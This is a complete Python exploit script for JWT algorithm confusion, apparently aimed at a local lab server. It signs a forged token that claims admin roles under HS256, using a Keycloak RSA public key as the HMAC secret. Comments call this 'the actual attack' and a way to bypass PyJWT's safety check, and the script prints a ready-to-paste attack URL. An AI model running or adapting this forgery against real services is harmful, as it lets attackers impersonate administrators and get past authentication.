import jwt as pyjwt, time

with open("keycloak_pub.pem", "rb") as f:
    public_key_pem = f.read()

payload = {
    "sub": "fake-user-id-123",
    "preferred_username": "evil-admin",
    "email": "hacker@evil.com",
    "realm_access": {"roles": ["admin", "user"]},
    "iat": int(time.time()),
    "exp": int(time.time()) + 3600,
    "iss": "http://localhost:8080/realms/gid-realm",
    "aud": "sp1-app"
}

# Bypass PyJWT's safety check by using raw bytes
# This simulates what a vulnerable server does internally
from jwt.algorithms import HMACAlgorithm
import json, base64, hmac, hashlib

def b64url(data):
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

header = {"alg": "HS256", "typ": "JWT"}
header_enc = b64url(json.dumps(header, separators=(',', ':')))
payload_enc = b64url(json.dumps(payload, separators=(',', ':')))

signing_input = f"{header_enc}.{payload_enc}".encode()

# Use the PUBLIC KEY as the HMAC secret (the actual attack)
sig = hmac.new(public_key_pem, signing_input, hashlib.sha256).digest()
sig_enc = b64url(sig)

forged = f"{header_enc}.{payload_enc}.{sig_enc}"

print("Forged token:")
print(forged)
print()
print("Attack URL — paste this in your browser:")
print(f"http://localhost:5001/vulnerable-jwt?token={forged}")